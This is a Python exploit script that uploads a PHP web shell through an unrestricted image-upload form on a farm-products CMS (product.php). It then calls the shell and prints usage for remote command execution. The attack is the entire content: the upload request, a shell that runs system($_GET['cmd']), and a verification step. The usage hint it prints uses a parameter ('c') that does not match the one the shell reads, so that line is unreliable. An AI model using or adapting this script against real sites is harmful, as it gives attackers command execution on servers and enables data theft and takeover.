# Coded by vishal waghmare github@hacksudo , hub.docker/hacksudo , instagram.com/realvilu 
import requests
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# you can set path of your CMS here it may be after farm or anything just  check it 
def upload_backdoor(target):
    upload_url = f"{target}/product.php"
    shell_url = f"{target}/assets/img/productimages/web-backdoor.php"

    # Prepare the payload
    payload = {
        'category': 'CHICKEN',
        'product': 'rce',
        'price': '100',
        'save': ''
    }

    # PHP backdoor code
    data = "<?php system($_GET['cmd']); ?>"

    # Prepare the file data
    files = {
        'productimage': ('web-backdoor.php', data, 'application/x-php')
    }

    try:
        print("Sending POST request to:", upload_url)
        response = requests.post(upload_url, files=files, data=payload, verify=False)

        if response.status_code == 200:
            print("\nResponse status code:", response.status_code)
            print(f"Shell has been uploaded successfully: {shell_url}")

            # Make a GET request to verify the shell is accessible
            shell_response = requests.get(shell_url, verify=False)
            print("Command output:", Fore.GREEN + shell_response.text.strip())

            print(f"\nExecute commands via: {shell_url}?c=whoami")
        else:
            print(f"Failed to upload shell. Status code: {response.status_code}")
            print("Response content:", response.text)
    except requests.RequestException as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    target = "http://localhost"  # Change this to your target
    upload_backdoor(target)
